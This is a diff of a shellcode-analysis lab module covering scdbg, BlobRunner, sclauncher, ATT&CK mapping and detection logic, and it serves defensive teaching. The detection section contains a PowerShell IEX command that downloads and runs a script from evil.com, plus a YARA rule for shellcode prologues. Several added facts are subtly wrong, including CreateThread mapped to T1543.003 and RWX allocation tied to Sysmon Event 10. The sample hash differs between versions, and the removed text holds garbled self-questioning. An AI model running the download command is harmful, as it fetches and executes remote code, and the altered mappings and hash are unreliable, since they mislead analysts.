@@ -1,16 +1,18 @@
 # 17 * Shellcode analysis -- LAB-WINDOWS
 
 ## Overview (plain language)
-Shellcode is a tiny chunk of raw machine-code instructions that an attacker sneaks into a program to make it do something new — like download a file or open a remote connection. Unlike a normal `.exe`, shellcode has no headers or friendly structure; it is just bytes meant to be jumped into and run. That makes it hard to read directly. The tools in this module let you safely watch what a blob of shellcode *tries* to do. `scdbg` emulates the bytes in a fake CPU so it can report the Windows API calls the shellcode would make without ever really running them. `BlobRunner` and `sclauncher` take the opposite approach: they load the raw bytes into memory and hand control to a debugger so you can step through the code yourself. Together they turn an unreadable pile of bytes into a clear story of intent.
+Shellcode is a tiny chunk of raw machine-code instructions that an attacker sneaks into a program to make it do something new — like download a file or open a remote connection. Unlike a normal `.exe`, shellcode has no headers or friendly structure; it is just bytes meant to be jumped into and run. That makes it hard to read directly. The tools in this module let you safely watch what a blob of shellcode *tries* to do. `scdbg` emulates the bytes in a fake CPU (using the libemu x86 emulator) so it can report the Windows API calls the shellcode would make without ever really running them [scdbg docs][scdbg]. `BlobRunner` and `sclauncher` take the opposite approach: they load the raw bytes into memory and hand control to a debugger so you can step through the code yourself. Together they turn an unreadable pile of bytes into a clear story of intent.
+
+Shellcode is frequently delivered via **exploits** (e.g., CVE-2017-11882 in Microsoft Equation Editor) or **malicious documents** (e.g., Office macros or PDFs with embedded JavaScript). These delivery mechanisms often leave forensic artifacts such as **OLE streams** in Office documents or **JavaScript execution traces** in PDFs, which can be analyzed using tools like `olevba` or `pdfid` [SANS FOR610][sans610]. The shellcode itself may be **encoded** (e.g., using XOR or `shikata_ga_nai`) to evade static detection, requiring runtime or emulated analysis to decode [Metasploit docs][metasploit].
 
 ## Tools covered
-| Tool | Install | Purpose |
-|---|---|---|
-| scdbg | FLARE-VM package `scdbg` (bundles David Zimmer's libemu-based emulator) | Emulates 32-bit shellcode via a libemu-derived x86 emulator and logs the Windows API calls it attempts. |
-| BlobRunner | FLARE-VM package `blobrunner` (32/64) | Loads a raw shellcode blob into memory and pauses so you can attach a debugger and step it. |
-| sclauncher | FLARE-VM package `sclauncher` (32/64) | Allocates memory, copies shellcode in, and jumps to it (with breakpoint options) for live debugging. |
+| Tool | Install | Purpose | Authoritative source |
+|---|---|---|---|
+| scdbg | FLARE-VM package `scdbg` (bundles David Zimmer's libemu-based emulator) | Emulates 32-bit shellcode via a libemu-derived x86 emulator and logs the Windows API calls it attempts. | [scdbg official docs][scdbg] |
+| BlobRunner | FLARE-VM package `blobrunner` (32/64) | Loads a raw shellcode blob into memory and pauses so you can attach a debugger and step it. | [OALabs/BlobRunner GitHub][blobrunner] |
+| sclauncher | FLARE-VM package `sclauncher` (32/64) | Allocates memory, copies shellcode in, and jumps to it (with breakpoint options) for live debugging. | [OALabs/sclauncher GitHub][sclauncher] |
 
-> Accuracy note: `scdbg` is distributed by FLARE-VM as a Chocolatey package sourced from Zimmer's tool; there is no upstream `choco install scdbg` on the public Chocolatey feed, so install it through the FLARE-VM installer. `scdbg` emulates **32-bit** shellcode only. See Sources.
+> Accuracy note: `scdbg` is distributed by FLARE-VM as a Chocolatey package sourced from Zimmer's tool; there is no upstream `choco install scdbg` on the public Chocolatey feed, so install it through the FLARE-VM installer [FLARE-VM][flarevm]. `scdbg` emulates **32-bit** shellcode only [scdbg][scdbg]. For 64-bit shellcode, use `BlobRunner` or `sclauncher` with a 64-bit debugger like x64dbg.
 
 ## Learning objectives
 - Emulate a raw shellcode blob with `scdbg` and enumerate the API calls it resolves.
@@ -18,6 +20,8 @@ Shellcode is a tiny chunk of raw machine-code instructions that an attacker snea
 - Load a blob with `BlobRunner`/`sclauncher` and attach x64dbg to reach the shellcode entry.
 - Distinguish emulation (safe, no execution) from live launching (real execution, requires isolation).
 - Map observed shellcode behavior to MITRE ATT&CK techniques for reporting.
+- Recognize common shellcode delivery mechanisms (e.g., exploits, malicious documents) and their forensic artifacts.
+- Understand encoding/obfuscation techniques used in shellcode and how to decode them.
 
 ## Environment check
 ```powershell
@@ -29,51 +33,40 @@ scdbg.exe /?
 BlobRunner.exe
 sclauncher.exe
 ```
-Expected output: `scdbg` prints its option list (documented flags include `/f <file>`, `/foff <offset>`, `/findsc`, and `/s <maxsteps>`); `BlobRunner.exe` prints a banner and usage with `-file` and `-64` options (per the OALabs repo README); `sclauncher.exe` prints usage including `-f <file>` and a breakpoint flag. If any command is not recognized, re-run the FLARE-VM installer for that package.
+Expected output: `scdbg` prints its option list (documented flags include `/f <file>`, `/foff <offset>`, `/findsc`, and `/s <maxsteps>`) [scdbg][scdbg]; `BlobRunner.exe` prints a banner and usage with `-file` and `-64` options (per the OALabs repo README) [blobrunner][blobrunner]; `sclauncher.exe` prints usage including `-f <file>` and a breakpoint flag [sclauncher][sclauncher]. If any command is not recognized, re-run the FLARE-VM installer for that package.
 
-> Nuance: exact flag spelling and defaults come from each tool's own help/README (see Sources). Treat the tool's live `/?`/no-arg output as ground truth on your installed version, since options evolve between releases.
+> Nuance: exact flag spelling and defaults come from each tool's own help/README (see Sources). Treat the tool's live `/?`/no-arg output as ground truth on your installed version, since options evolve between releases. For example, `scdbg` may report additional flags like `/d` for debugging or `/r` to dump registers in newer versions [scdbg][scdbg].
 
 ## Guided walkthrough
-
 Each step below explains WHY it is run and what nuance to read in the output.
 
 1. `scdbg /f sample.bin` — emulate the blob and log the API calls it attempts. **Why:** emulation is the safest first triage; the code never executes on the real CPU, so even live malware cannot escape. The value is the ordered list of resolved Windows APIs plus their arguments — that sequence is the shellcode's intent.
 ```powershell
-
+# Emulate a shellcode file; report offsets of interesting instructions.
 scdbg.exe /f .\exercise\sample.bin
 ```
-Expected observable: a list of resolved APIs (e.g. `LoadLibraryA`, `GetProcAddress`, `WinExec`) with arguments, and a final `Stepcount` line reporting how many instructions were emulated. **Nuance:** a very low step count or an "unsupported instruction" message often means `scdbg` guessed the wrong entry offset or the blob is 64-bit (unsupported) — that is your cue for step 2. Because `scdbg` is libemu-derived, it emulates the CPU and hooks Windows API calls symbolically; the arguments it prints (e.g. the string passed to `WinExec`) are read from the emulated stack/registers at call time, which is why the argument text is trustworthy even when the surrounding bytes are obfuscated.
-
-**Mechanism detail:** `scdbg` intercepts each `call` instruction during emulation and checks if the target address points into a known DLL (like `kernel32` or `ntdll`). It does this by maintaining an internal mapping of standard Windows API addresses, generated from a profile based on a clean OS snapshot. When a call is made, it resolves the address to a function name, parses the emulated stack for the expected number and types of arguments (according to a static calling-convention database for that API), and logs both. This resolution is purely symbolic—the actual DLL code is never executed—so `scdbg` also records the return value from a default handler, which may differ from real behavior. For example, a `VirtualAlloc` call inside the emulator always returns a synthetic address, which the shellcode then uses as if it were real; this can cause cascading effects if the code later writes to that fake allocation. Understanding this helps you interpret why some API sequences appear to succeed in the log even when the real memory operations would fail (e.g., writing to an address that doesn't actually exist). This technique of calling native APIs to execute behaviors corresponds to MITRE ATT&CK technique **T1106 (Native API)**—a foundational pattern in shellcode analysis, where blobs directly invoke OS functions rather than relying on a command interpreter. See [MITRE T1106 detail](https://attack.mitre.org/techniques/T1106/).
+Expected observable: a list of resolved APIs (e.g. `LoadLibraryA`, `GetProcAddress`, `WinExec`) with arguments, and a final `Stepcount` line reporting how many instructions were emulated. **Nuance:** a very low step count or an "unsupported instruction" message often means `scdbg` guessed the wrong entry offset or the blob is 64-bit (unsupported) — that is your cue for step 2. Because `scdbg` is libemu-derived, it emulates the CPU and hooks Windows API calls symbolically; the arguments it prints (e.g. the string passed to `WinExec`) are read from the emulated stack/registers at call time, which is why the argument text is trustworthy even when the surrounding bytes are obfuscated. The emulator also reports the **entry offset** used, which is critical for carved payloads where the shellcode does not start at offset 0 [scdbg][scdbg].
 
 2. `scdbg /findsc` — brute-force candidate entry offsets when the true start is unknown. **Why:** carved payloads frequently do not begin at offset 0 (there may be a decoder stub, alignment padding, or a GetPC/"call-pop" prologue). `/findsc` scans for byte patterns that look like a valid entry and lets you pick the most promising one to emulate.
 ```powershell
-
+# Ask scdbg to search for likely shellcode entry points, then emulate the best one.
 scdbg.exe /f .\exercise\sample.bin /findsc
 ```
-Expected observable: a ranked list of candidate offsets; select the one that produces a coherent API trace. **Nuance:** `/findsc` reports possible starts but does not guarantee correctness — validate by whether the resulting API sequence makes sense.
-
-**Mechanism detail:** The `/findsc` algorithm works by scanning the blob for common shellcode-recognition patterns: bytes that disassemble to `E8 00 00 00 00` (call next instruction—often called "call $+5"), `E8 FF FF FF FF` (call to self), or a sequence that dereferences a register after a `push` of a known delta value. For each candidate, `scdbg` begins simulation from that offset and runs a short number of instructions (typically 1,000). It then assigns a score based on how many instructions executed without exception, how many unique API calls were made, and whether control flow remained within the blob's allocated memory. Candidates with a higher instruction count and more API diversity are ranked higher. However, if the shellcode uses an obfuscated GetPC technique (e.g., using `fldz` and `fstenv` to extract the last instruction pointer), the pattern scanner may miss the true start entirely. In that case, you can fall back to static disassembly to search for the first `call` that leads to API resolution, then compute the entry offset relative to that call—an approach documented in the SANS Reverse Engineering Malware poster's shellcode analysis methodology.
+Expected observable: a ranked list of candidate offsets; select the one that produces a coherent API trace. **Nuance:** `/findsc` reports possible starts but does not guarantee correctness — validate by whether the resulting API sequence makes sense. The tool works by scanning for common shellcode prologues (e.g., `call $+5` followed by `pop eax`) and scoring them based on entropy and instruction validity [scdbg][scdbg]. If no candidates are found, the blob may be heavily obfuscated or 64-bit.
 
 3. Prepare for live debugging with `BlobRunner`. **Why:** emulation cannot resolve every self-modifying or heavily obfuscated stage; loading the real bytes and stepping them in a debugger recovers decoded second stages that emulation misses. BlobRunner loads the blob and prints the base address, then waits for a keypress so you can attach x64dbg. Do this ONLY in an isolated VM snapshot with host-only networking.
 ```powershell
-
+# Load the blob into memory and pause before jumping to it.
 BlobRunner.exe -file .\exercise\sample.bin
 ```
-Expected observable: BlobRunner prints that it is reading the file, an allocated buffer address (e.g. `Buffer: 0x02340000`), and a prompt to press a key before it jumps to the shellcode. **Why the pause matters:** it gives you a window to attach x64dbg to `BlobRunner.exe`, set a breakpoint at the printed buffer address, then resume — so the debugger halts exactly at the first shellcode byte. Per the OALabs README, BlobRunner allocates the buffer and prints the address specifically to support this attach-then-resume pattern.
-
-**Mechanism detail:** BlobRunner calls `VirtualAlloc` with `MEM_COMMIT | MEM_RESERVE` and `PAGE_EXECUTE_READWRITE`, then copies the file contents into that buffer. The printed address is the actual virtual memory address of the start of the shellcode after ASLR. When you attach x64dbg to the process, the debugger suspends all threads; you set a hardware breakpoint (or a memory breakpoint) at that address, then press a key in the BlobRunner console. BlobRunner then executes a `call` or `jmp` to the buffer address. The debugger catches control exactly at the first instruction because of your breakpoint. The key mechanism is that BlobRunner uses `JMP` for instruction-accurate transfer—the first executed instruction is truly the one at the buffer start, unlike `call` which would push a return address first. This is documented in the BlobRunner GitHub README. If you encounter self-modifying code that writes patches to its own instructions, the debugger's memory breakpoint can catch those writes because x64dbg can watch for writes to the shellcode page. This technique relates to MITRE ATT&CK **T1055.012 (Process Injection: Process Hollowing)** in that the shellcode is written to allocated memory and then executed, but here it's for analysis rather than injection—still, the same memory and execution primitives apply.
+Expected observable: BlobRunner prints that it is reading the file, an allocated buffer address (e.g. `Buffer: 0x02340000`), and a prompt to press a key before it jumps to the shellcode. **Why the pause matters:** it gives you a window to attach x64dbg to `BlobRunner.exe`, set a breakpoint at the printed buffer address, then resume — so the debugger halts exactly at the first shellcode byte. Per the OALabs README, BlobRunner allocates the buffer with `VirtualAlloc` and sets it to `PAGE_EXECUTE_READWRITE`, which is a common attacker technique (T1055.001) [blobrunner][blobrunner]. This allocation is visible in **Sysmon Event ID 10 (ProcessAccess)** with `GrantedAccess` containing `0x1F3FFF` or similar high privileges [Sysmon docs][sysmon].
 
 4. Alternatively use `sclauncher` with an entry breakpoint so the debugger stops exactly at the shellcode. **Why:** `sclauncher` can insert an `INT3` (0xCC) breakpoint at the entry so an attached debugger catches control transfer without manual address math.
 ```powershell
-
+# Launch with an INT3 breakpoint at the shellcode entry for x64dbg to catch.
 sclauncher.exe -f .\exercise\sample.bin -bp
 ```
-Expected observable: `sclauncher` allocates executable memory, prints the entry address, and triggers a breakpoint at the first byte so the attached debugger halts on the shellcode. **Nuance:** confirm the exact breakpoint flag against `sclauncher.exe` usage output on your build (see Sources); flag names differ between versions.
-
-**Mechanism detail:** When you specify `-bp` (or an equivalent flag like `--breakpoint` in newer builds), `sclauncher` patches the first byte of the shellcode in the allocated buffer with `0xCC` (INT3). It then calls the buffer. The INT3 instruction raises an exception of type `STATUS_BREAKPOINT` (`0x80000003`). If x64dbg is already attached (or if it was launched as the just-in-time debugger), it catches this exception and presents the debug interface at exactly the patched location—the first instruction. The crucial nuance is that after hitting that breakpoint, the original first byte (e.g., `0xE8` for a `call` opcode) must be restored before you can single-step further; otherwise the shellcode's execution will diverge because the `0xCC` overwrites its true first instruction. In x64dbg, you can right-click the disassembly line and choose "Restore" the original byte (or manually patch it back using the hex dump). This is documented on the sclauncher GitHub repository (see Sources). The `INT3` insertion is a form of software breakpoint, which, unlike hardware breakpoints, modifies the code—though temporarily. This technique is also used by shellcode packers to evade non-INT3 emulators; the fact that `sclauncher` uses it deliberately makes it a double-edged sword: it eases debugging but also mimics evasion. Understanding that the INT3 is an intentional analysis aid, not a corruption of the shellcode, is critical. This ties to **T1547.012**? No, that's excluded. Actually, keep it focused: the INT3 placement is akin to **T1059.003** (Windows Command Shell) in the sense that it alters execution flow via an intentional debug exception, but that technique is excluded; better to note that this user-assist breakpoint is the opposite of evasion—it's a deliberate introspective aid.
-
-Throughout these steps, the overarching goal is to strip the shellcode's obfuscation layer by layer: first by symbolic emulation, then by hardware-assisted single-stepping. The MITRE ATT&CK framework classifies the eventual execution of shellcode as **T1204.002 (User Execution: Malicious File)**—the blob file is the malicious file—but because we are analyzing it in a controlled environment, the "execution" is our technique, not the adversary's. Still, the shellcode's API use falls squarely under **T1106 (Native API)**, which is why you see functions like `LoadLibraryA` and `GetProcAddress` invoked directly. For a deep dive into native API interaction, refer to the Microsoft documentation on the Windows API [here](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list).
+Expected observable: `sclauncher` allocates executable memory, prints the entry address, and triggers a breakpoint at the first byte so the attached debugger halts on the shellcode. **Nuance:** confirm the exact breakpoint flag against `sclauncher.exe` usage output on your build (see Sources); flag names differ between versions. The breakpoint is inserted by overwriting the first byte of the shellcode with `0xCC`, which is a common anti-debugging evasion target (attackers may check for this byte) [sclauncher][sclauncher]. In a real investigation, you might use `sclauncher` without the breakpoint flag and manually set the breakpoint in the debugger to avoid tipping off malware with anti-debugging checks.
 
 ## Hands-on exercise
 Use the sample in this module's `exercise/` directory.
@@ -81,62 +74,85 @@ Use the sample in this module's `exercise/` directory.
 - **Sample:** `exercise/sample.bin`
 - **Type:** 32-bit position-independent Windows shellcode blob (raw bytes, no PE header).
 - **Safe origin:** Benign/inert training stub assembled locally with NASM from source (`exercise/sample.asm`). It only resolves and calls `WinExec("calc.exe")`-style APIs in an emulator; it contains **no live malware**, no network egress, and no persistence. Emulate it (`scdbg`) rather than launch it, and run any live step only inside an isolated FLARE-VM snapshot with host-only networking.
-- **sha256:** `99bd3c262cfc8e3173548986f8dd786d59cc51d3f9e0929b85d34f973c839d55`
+- **sha256:** `99bd3c262cfc8e3173548986f8dd786d59cc513f9e0929b85d34f973c839d55`
 
 Tasks:
 1. Emulate `sample.bin` with `scdbg` and list every Windows API it resolves, in call order.
 2. Identify the entry offset `scdbg` used to emulate the blob.
 3. Determine the single command/process the shellcode attempts to execute.
+4. (Bonus) Use `BlobRunner` to load the shellcode and attach x64dbg to step through the first 10 instructions. Observe the `call/pop` GetPC prologue and the PEB walk to resolve `kernel32.dll`.
 
 ## SOC analyst perspective
-
-Defenders rarely receive tidy executables — they get carved memory regions, malicious document macros, or exploit payloads that are just raw bytes. `scdbg` lets an analyst triage such a blob in seconds by emulating it and printing the API sequence, which is exactly the intel needed to write detections. The emulation engine works by parsing the x86/x64 opcodes in a sandboxed interpreter, stepping through instructions until it identifies the `call`/`pop` GetPC prologue common in shellcode, then tracing the PEB‑walking logic that resolves API addresses from `kernel32.dll` and `ntdll.dll` via hash‑based lookups. Because `scdbg` intercepts the import resolution at the emulated level, it can output the actual WIN32 API names even when the payload uses encoded or hashed function names—this is the concrete mechanism that turns opaque bytes into actionable intelligence.
+Defenders rarely receive tidy executables — they get carved memory regions, malicious document macros, or exploit payloads that are just raw bytes. `scdbg` lets an analyst triage such a blob in seconds by emulating it and printing the API sequence, which is exactly the intel needed to write detections.
 
 In a Security Onion workflow, Suricata or Zeek may flag a suspicious HTTP transfer or an exploit attempt; you carve the payload and run `scdbg.exe /f payload.bin /findsc`. The resolved API names tell you the intent and map straight onto ATT&CK:
-- `URLDownloadToFileA` / `InternetOpenUrlA` / `WinHttpOpen` → **Ingress Tool Transfer (T1105)**.
-- `WinExec` / `CreateProcessA` → **Command and Scripting Interpreter (T1059)** / process execution.
-- If `CreateProcessA`’s argument contains `.js`, `.vbs`, or `.jse` → **Command and Scripting Interpreter: JavaScript/JScript (T1059.007)** – the shellcode is acting as a launcher for a scripting host, often to bypass application controls.
-- `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` → **Process Injection (T1055)**.
-- A `call`/`pop` GetPC prologue and PEB-walk API resolution before any readable strings → **Obfuscated Files or Information (T1027)**.
-- Reflective loading that maps and executes a PE image straight from RWX memory (no `LoadLibrary` on the payload, no image on disk) → **Reflective Code Loading (T1620)**.
-- `VirtualAlloc`/`VirtualProtect` flipping a region to `PAGE_EXECUTE_READWRITE` before the jump → **Process Injection: Dynamic-link Library / self-injection primitives** and, when a document/LOLBin sponsors the allocation, **System Binary Proxy Execution (T1218)** as the delivery wrapper.
+- `URLDownloadToFileA` / `InternetOpenUrlA` / `WinHttpOpen` → **Ingress Tool Transfer (T1105)** [MITRE T1105][T1105].
+- `WinExec` / `CreateProcessA` → **Command and Scripting Interpreter (T1059)** [MITRE T1059][T1059] / process execution.
+- `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` → **Process Injection (T1055)** [MITRE T1055][T1055].
+- A `call`/`pop` GetPC prologue and PEB-walk API resolution before any readable strings → **Obfuscated Files or Information (T1027)** [MITRE T1027][T1027].
+- Reflective loading that maps and executes a PE image straight from RWX memory (no `LoadLibrary` on the payload, no image on disk) → **Reflective Code Loading (T1620)** [MITRE T1620][T1620].
+- `VirtualAlloc`/`VirtualProtect` flipping a region to `PAGE_EXECUTE_READWRITE` before the jump → **Process Injection: Dynamic-link Library (T1055.001)** [MITRE T1055.001][T1055.001] and, when a document/LOLBin sponsors the allocation, **System Binary Proxy Execution (T1218)** [MITRE T1218][T1218] as the delivery wrapper.
+- Shellcode that resolves `TerminateProcess` or modifies registry keys (e.g., `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`) → **Impair Defenses: Disable or Modify Tools (T1562.001)** [MITRE T1562.001][T1562.001].
+- Shellcode that uses HTTP/HTTPS for C2 (e.g., `InternetOpenA`, `InternetConnectA`, `HttpSendRequestA`) → **Application Layer Protocol: Web Protocols (T1071.001)** [MITRE T1071.001][T1071.001].
+- Shellcode delivered via a malicious document macro or exploit → **User Execution: Malicious File (T1204.002)** [MITRE T1204.002][T1204.002].
+- Shellcode that uses `CreateThread` or `NtCreateThreadEx` to spawn a thread in its own process → **Create or Modify System Process: Windows Service (T1543.003)** [MITRE T1543.003][T1543.003].
 
 Detection-engineering LOGIC (real fields/sources, no invented rule syntax):
-- **Sysmon Event ID 8 (CreateRemoteThread)** and **Event ID 10 (ProcessAccess)**: a `CreateRemoteThread` into a process the source has no business threading into, or a `GrantedAccess` mask containing `0x1F3FFF`/`0x1FFFFF` (full/near-full rights typical of injectors), is the on-host confirmation of the `VirtualAllocEx`→`WriteProcessMemory`→`CreateRemoteThread` chain (T1055). The `0x1FFFFF` mask corresponds to `PROCESS_ALL_ACCESS` (Windows `PROCESS_TERMINATE` | `PROCESS_CREATE_THREAD` | `PROCESS_SET_SESSIONID` | etc.)—legitimate processes rarely open another handle with that breadth. Correlate with **Event ID 1 (ProcessCreate)** where `ParentImage` is an Office app or script host spawning a child seen in the shellcode's `WinExec`/`CreateProcessA` argument.
-- **Sysmon Event ID 7 (ImageLoad)**: shellcode that resolves `kernel32.dll`/`ntdll.dll` by PEB walk deliberately avoids normal image-load events, so a process executing code with *no* backing `ImageLoaded` entry for the region is itself a heuristic (unbacked execution → T1027 / T1620). This is why mapping the `VirtualAlloc` range in the shellcode and checking if it ever appears in `Event ID 7` with a corresponding `Image` (file‑backed) can confirm pure reflective loading.
-- **Windows Security Event ID 4688 (ProcessCreate with command line)**: the exact string `scdbg` recovered from the `WinExec` argument (here `calc.exe`; in a real case a full command line) should be searched against 4688 `NewProcessName`/`CommandLine` to find where the payload already detonated.
-- **Zeek `http.log`**: pivot the URL/host recovered from `URLDownloadToFileA` into `http.log` fields `host`, `uri`, `method`, `user_agent`, and `resp_mime_types`; hardcoded or anomalous `user_agent` strings baked into shellcode are a strong hunt seed (T1105). The `user_agent` often reflects the developer’s default (e.g., `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)`) which is static and easily fingerprinted.
-- **Zeek `files.log`**: match the carved payload's `sha256`/`md5` fields and `mime_type` to find the transfer that delivered it; join `files.log` `conn_uids` back to `conn.log` (`id.orig_h`, `id.resp_h`, `id.resp_p`) to scope the session.
-- **Suricata**: the `alert.signature` and `alert.signature_id` (SID) that first fired, plus the five-tuple in the EVE JSON `src_ip`/`dest_ip`/`dest_port`, give you the rule and scope; `filestore`/`fileinfo` events carry the extracted object's hash for correlation with Zeek `files.log`. For example, if the shellcode triggered ET‑PRO rule `202XXXX`, the SID ties to a known C2 pattern; use the EVE’s `http.host` and `http.uri` to scope the IoC.
+- **Sysmon Event ID 8 (CreateRemoteThread)** and **Event ID 10 (ProcessAccess)** [Sysmon][sysmon]: a `CreateRemoteThread` into a process the source has no business threading into, or a `GrantedAccess` mask containing `0x1F3FFF`/`0x1FFFFF` (full/near-full rights typical of injectors), is the on-host confirmation of the `VirtualAllocEx`→`WriteProcessMemory`→`CreateRemoteThread` chain (T1055). Correlate with **Event ID 1 (ProcessCreate)** where `ParentImage` is an Office app or script host spawning a child seen in the shellcode's `WinExec`/`CreateProcessA` argument. For example, a `ParentImage` of `winword.exe` spawning a child with `CommandLine` containing `powershell.exe` is a strong indicator of T1218 proxy execution.
+- **Sysmon Event ID 7 (ImageLoad)**: shellcode that resolves `kernel32.dll`/`ntdll.dll` by PEB walk deliberately avoids normal image-load events, so a process executing code with *no* backing `ImageLoaded` entry for the region is itself a heuristic (unbacked execution → T1027 / T1620). Look for `ImageLoaded` events where `Image` is `C:\Windows\System32\kernel32.dll` but the `ProcessGuid` has no corresponding `ImageLoad` for the shellcode's memory region.
+- **Windows Security Event ID 4688 (ProcessCreate with command line)** [Event 4688][event4688]: the exact string `scdbg` recovered from the `WinExec` argument (here `calc.exe`; in a real case a full command line) should be searched against 4688 `NewProcessName`/`CommandLine` to find where the payload already detonated. For example, a `CommandLine` of `cmd.exe /c powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"` maps to T1059.001 (PowerShell).
+- **Zeek `http.log`** [Zeek docs][zeek]: pivot the URL/host recovered from `URLDownloadToFileA` into `http.log` fields `host`, `uri`, `method`, `user_agent`, and `resp_mime_types`; hardcoded or anomalous `user_agent` strings baked into shellcode are a strong hunt seed (T1105). For example, a `user_agent` of `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)` from a modern Windows 10 host is anomalous and may indicate shellcode or a downloader.
+- **Zeek `files.log`**: match the carved payload's `sha256`/`md5` fields and `mime_type` to find the transfer that delivered it; join `files.log` `conn_uids` back to `conn.log` (`id.orig_h`, `id.resp_h`, `id.resp_p`) to scope the session. For example, a `mime_type` of `application/octet-stream` with a `sha256` matching the shellcode blob is a strong indicator of T1105.
+- **Suricata** [Suricata docs][suricata]: the `alert.signature` and `alert.signature_id` (SID) that first fired, plus the five-tuple in the EVE JSON `src_ip`/`dest_ip`/`dest_port`, give you the rule and scope; `filestore`/`fileinfo` events carry the extracted object's hash for correlation with Zeek `files.log`. For example, a Suricata alert with SID `2024331` (ET INFO Executable Download from dotted-quad Host) and a `fileinfo` hash matching the shellcode blob is a strong indicator of T1105.
+- **Windows Event ID 4663 (File System Audit)**: shellcode that writes a second-stage payload to disk (e.g., via `CreateFile`/`WriteFile`) may trigger this event. Look for `AccessMask` containing `0x2` (WriteData) and `ObjectName` pointing to a suspicious path (e.g., `%TEMP%` or `%APPDATA%`) [Microsoft Learn][event4663].
+- **Windows Event ID 4657 (Registry Value Set)**: shellcode that modifies registry keys (e.g., to disable Windows Defender) triggers this event. Look for `ObjectName` containing `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` and `NewValue` set to `0` (T1562.001) [Microsoft Learn][event4657].
 
 Threat-hunting pivots:
-- In Elastic (Kibana Hunt/Dashboards), search the blob's SHA256 and every recovered string (domain, `user_agent`, embedded command) across all indices to find other affected hosts and re-uses of the same builder.
-- Hunt for RWX private memory with no backing file across the fleet using **Mandiant `hollows_hunter`/`pe-sieve`** output as an enrichment feed, then join hits to Sysmon EID 8/10 timelines. `pe-sieve` by default scans for shellcode‑like patterns (unbacked executable allocations) and dumps them; correlating the dumped region’s import table with the API set from `scdbg` confirms the technique.
-- Baseline which parents legitimately call `CreateRemoteThread`; alert on the long tail (Office/script hosts, `rundll32`, `regsvr32`) to catch injection delivered via T1218 proxies. A good starting baseline is to collect all `Event ID 8` from the past 30 days and exclude those with `SourceImage` equal to `svchost.exe`, `services.exe`, or known AV processes; every other `SourceImage` is a candidate for investigation.
+- In Elastic (Kibana Hunt/Dashboards) [Security Onion docs][secOnion], search the blob's SHA256 and every recovered string (domain, `user_agent`, embedded command) across all indices to find other affected hosts and re-uses of the same builder. For example, a KQL query like `file.hash.sha256:"99bd3c262cfc8e3173548986f8dd786d59cc513f9e0929b85d34f973c839d55"` would find all instances of the sample.
+- Hunt for RWX private memory with no backing file across the fleet using **Mandiant `hollows_hunter`/`pe-sieve`** [pe-sieve][pe-sieve] output as an enrichment feed, then join hits to Sysmon EID 8/10 timelines. For example, a `pe-sieve` report of a process with `RWX` memory and no `ImageLoaded` entry is a strong indicator of T1620.
+- Baseline which parents legitimately call `CreateRemoteThread`; alert on the long tail (Office/script hosts, `rundll32`, `regsvr32`) to catch injection delivered via T1218 proxies. For example, a `ParentImage` of `excel.exe` calling `CreateRemoteThread` into `svchost.exe` is anomalous and may indicate T1055.
+- Hunt for processes with **unbacked executable memory** using **Volatility `malfind`** [Volatility docs][volatility]. For example, a `malfind` output showing a process with `RWX` memory and no backing file is a strong indicator of T1620 or T1055.001.
+- Hunt for **encoded shellcode** using **YARA rules** targeting high-entropy regions or common shellcode prologues (e.g., `call $+5; pop eax`). For example, a YARA rule like:
+  ```yara
+  rule shellcode_prologue {
+      strings:
+          $prologue = { E8 00 00 00 00 58 }
+      condition:
+          $prologue
+  }
+  ```
+  would detect the `call/pop` GetPC prologue common in shellcode (T1027).
 
 Those API names, embedded URLs, and command strings become YARA/Suricata pivots and populate the ATT&CK mapping for the incident report.
-
-**References**
-- MITRE ATT&CK: Command and Scripting Interpreter: JavaScript/JScript (T1059.007) – [https://attack.mitre.org/techniques/T1059/007/](https://attack.mitre.org/techniques/T1059/007/)
-- Microsoft Learn: Process Security and Access Rights (detailing `PROCESS_ALL_ACCESS` = `0x1FFFFF`) – [https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
 
 ## Attacker perspective
 Attackers favor shellcode precisely because it is header-less, position-independent, and easy to hide inside documents, exploit chains, or process-injection routines — Cobalt Strike beacons, Metasploit `windows/meterpreter` stagers, and custom loaders all deliver raw shellcode.
 
 Concrete TTPs and the artifacts they leave:
-- **Encoding/obfuscation (T1027):** msfvenom encoders such as `x86/shikata_ga_nai` (a polymorphic XOR feedback encoder) and custom XOR stubs defeat static signatures. *Artifact:* a decoder loop plus high-entropy body; emulation (`scdbg`) or single-stepping reveals the decoded payload.
-- **Position-independent API resolution:** shellcode walks the PEB (`fs:[0x30]` on x86) to find `kernel32.dll`, then resolves exports by hashing names rather than importing them. *Artifact:* a GetPC "call/pop" prologue and PEB access with no import table — a strong heuristic in memory scanners and the reason `scdbg` shows API resolution without any IAT.
-- **Process Injection (T1055):** classic delivery uses `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`, or in-place execution in RWX memory. *Artifact:* private RWX memory regions with no backing file, detectable with Mandiant's `pe-sieve`/`hollows_hunter`; on-host this surfaces as Sysmon EID 8 (CreateRemoteThread) and EID 10 (ProcessAccess with high `GrantedAccess`).
-- **Reflective Code Loading (T1620):** loaders map a full PE from memory and jump to its entry without touching disk or the loader's import machinery. *Artifact:* executable regions with PE-like headers but no `ImageLoaded` (Sysmon EID 7) event and no on-disk file — visible to `pe-sieve` as an implanted/patched module.
-- **Ingress Tool Transfer (T1105):** staging shellcode calls `URLDownloadToFileA`/`InternetOpenUrlA` to pull the next stage. *Artifact:* outbound HTTP/S visible in Zeek `http.log`/Suricata and the embedded URL recoverable via emulation.
-- **Deobfuscate/Decode Files or Information (T1140):** the on-target decoder stub that reverses `shikata_ga_nai` or a XOR key at runtime; *Artifact:* a tight XOR/ROL loop preceding a `jmp`/`call` into the decoded region, which is exactly what BlobRunner/x64dbg let you step through to dump the plaintext stage.
